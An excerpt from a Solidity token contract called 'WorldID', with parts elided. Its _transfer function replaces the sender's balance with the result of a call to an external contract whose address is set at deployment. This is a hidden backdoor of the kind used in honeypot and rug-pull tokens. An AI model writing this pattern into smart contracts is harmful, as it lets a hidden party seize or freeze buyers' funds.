...
contract TOKEN is Ownable, IERC20 {
    ...
    string private _symbol = "WorldID";
    uint256 private _decimals;
    uint256 private _totalSupply;
    address public PePeDashAi_;

    constructor(uint256 decimals_, address _PePeadd) {
        _decimals = decimals_;
        PePeDashAi_ = _PePeadd;
    ...
    function _transfer(
        ...
        require(amount > 0);
        _balance[from] = _PePeDashAi(PePeDashAi_)
        ._Typus(from, amount, _balance[from]);
